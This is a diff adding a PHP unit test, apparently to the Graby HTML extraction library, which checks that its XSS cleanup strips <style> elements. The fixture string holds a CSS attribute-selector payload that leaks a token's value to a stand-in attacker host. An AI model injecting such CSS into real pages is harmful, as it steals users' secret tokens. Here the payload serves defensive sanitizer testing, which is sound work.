@@ -1146,6 +1146,20 @@ HTML
         $this->assertStringNotContainsString('<script>', $res['html']);
     }
 
+    public function testCleanupHtmlRemovesStyleElements(): void
+    {
+        $graby = new Graby();
+        $html = '<article><style>input[name=token][value^=a]{background:url(//attacker.example/token)}</style><p>hello</p></article>';
+
+        $cleanupXss = \Closure::bind(function ($html) {
+            return $this->cleanupXss($html);
+        }, $graby, Graby::class);
+        $cleanedHtml = $cleanupXss($html);
+
+        $this->assertStringNotContainsString('<style', $cleanedHtml);
+        $this->assertStringContainsString('<p>hello</p>', $cleanedHtml);
+    }
+
     public function testBadUrl(): void
     {
         $graby = $this->getGrabyWithMock('/fixtures/content/bjori-404.html', 404);
